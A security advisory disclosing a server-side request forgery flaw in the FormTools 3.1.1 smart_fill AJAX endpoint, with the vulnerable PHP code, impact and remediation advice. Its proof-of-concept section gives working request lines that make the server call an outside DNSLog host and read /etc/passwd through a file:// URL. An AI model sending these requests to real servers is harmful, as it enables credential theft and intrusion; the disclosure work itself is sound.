# FormTools 3.1.1 smart_fill endpoint SSRF

## Summary

The smart_fill branch of the FormTools AJAX endpoint global/code/actions.php accepts attacker-controlled url and scrape_method parameters: the file_get_contents/curl branches issue server-side requests to arbitrary URLs and echo the response body back. There is no scheme, host, or reserved-range filtering. The endpoint is reachable by any authenticated account (checkAuth('user', false) allows admin and client), enabling authenticated SSRF to read cloud IAM credentials and internal services.

## Details

global/code/actions.php is FormTools' unified AJAX dispatcher. It authenticates callers with Core::$user->checkAuth('user', false) (lines 31-55), which only requires a logged-in account (User.class.php:355-420) with no role restriction and no CSRF token. The case smart_fill (lines 200-227) uses $request['url'] and $request['scrape_method'] verbatim: for scrape_method=file_get_contents (lines 205-206) it calls file_get_contents($url); for curl (lines 213-217) it runs curl_exec with CURLOPT_URL; then it echoes the fetched response body (lines 209/221). The code never validates the URL scheme (http, file, etc.), the host (169.254.169.254, 127.0.0.1, internal ranges are allowed), or DNS resolution results, and it does not restrict redirects. Trust-boundary failure: untrusted request parameters reach server-side outbound fetch functions and the internal responses are reflected to the attacker. Source-to-sink: actions.php:44-55 authenticated entry -> $request['url'] controllable (201-202) -> file_get_contents/curl_exec (205-217) -> echo reflection (209/221).

Core vulnerable code path:

```php
// global/code/actions.php:200-227
case "smart_fill":
 $scrape_method = $request["scrape_method"];
 $url = $request["url"];
 switch ($scrape_method) {
  case "file_get_contents":
   $url = General::constructUrl($url, "ft_sessions_url_override=1");
   $html = file_get_contents($url); echo $html; break;
  case "curl":
   $c = curl_init(); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_URL, $url);
   $html = curl_exec($c); echo $html; break; }
```

Entry: any authenticated user (client or admin) passes an attacker-controlled url and scrape_method; no role restriction and no CSRF token are enforced.

```php
// global/code/actions.php:205-227
$html = file_get_contents($url); ... echo $html;
// or
$c = curl_init(); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_URL, $url);
$html = curl_exec($c); echo $html;
```

Sink: file_get_contents/curl_exec fetch an arbitrary URL (including cloud metadata and internal addresses) and the response is echoed back to the caller.

## POC

Preconditions: any logged-in FormTools account (client or admin). No special configuration is required: the `url` and `scrape_method` parameters are controllable by default. The `file://` branch requires `allow_url_fopen=On` in PHP, while the `curl` branch requires the `php-curl` extension.

Step1: GET /global/code/actions.php?action=smart_fill&scrape_method=curl&url=http://ajib3p.dnslog.cn with the session cookie. 

Expected result: the DNSLog platform received the corresponding request.
<img width="1397" height="285" alt="image" src="https://github.com/user-attachments/assets/cddca2ad-cdcc-49a3-8369-a8ab7321da24" />
<img width="1394" height="658" alt="image" src="https://github.com/user-attachments/assets/311b769e-1e63-47e5-8744-c4dee6e3323c" />


Step2: GET /global/code/actions.php?action=smart_fill&scrape_method=curl&url=file:///etc/passwd with the session cookie.

Expected result: return the corresponding file content.
<img width="1699" height="396" alt="image" src="https://github.com/user-attachments/assets/78f7c795-469f-4ed4-9f5f-2f1c4fffb18c" />


## Impact

Any authenticated user can make the server issue requests on their behalf, reading cloud IAM temporary credentials, internal Web/management service content, and port fingerprints. Combined with the same-endpoint arbitrary-file-upload issue this can escalate to internal lateral movement and full server compromise.

## Remediation

Enforce an http/https-only scheme allow-list; block RFC1918, link-local, reserved ranges and 169.254.0.0/16 and re-validate DNS resolution results; disable redirect following; reject file:// and gopher:// pseudo-protocols; restrict smart_fill to administrators bound to an in-progress session; add CSRF token validation to actions.php.

## Supplemental Information

### Affected products

- Vendor / project: Form Tools Core
- Repository: https://github.com/formtools/core
- Issue：https://github.com/formtools/core/issues/958
- Package name: formtools
- Affected versions: 3.1.1
- Patched versions: none confirmed

### Vulnerability type

- Server-Side Request Forgery
- CWE: CWE-918 Server-Side Request Forgery (SSRF)
- Suggested severity: High

### Reporter

Guangzhou University: Wen Youwen, Wang Le
